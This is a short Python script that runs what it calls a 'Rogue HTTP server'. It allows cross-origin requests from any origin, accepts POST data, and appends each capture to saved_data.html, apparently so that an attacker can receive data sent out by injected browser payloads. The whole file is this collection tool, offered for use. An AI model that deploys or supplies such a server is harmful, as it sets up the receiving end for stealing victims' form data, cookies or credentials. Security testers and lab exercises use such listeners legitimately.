from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote
# let's extent http.server:
class CustomRequestHandler(SimpleHTTPRequestHandler):

    def end_headers(self):
        # allow requests from any origin:
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'[+] GET request captured!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        self.send_response(200)
        self.end_headers()

        # log the captured POST data to saved_data.html for future reference...
        with open('saved_data.html', 'a') as file:
            file.write(post_data + '\n')
        response = f'[+] POST request captured! Received data: {post_data}'
        self.wfile.write(response.encode('utf-8'))

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    print('[i] Rogue HTTP server started on: http://localhost:8080/')
    # run forever (a very long time):
    httpd.serve_forever()
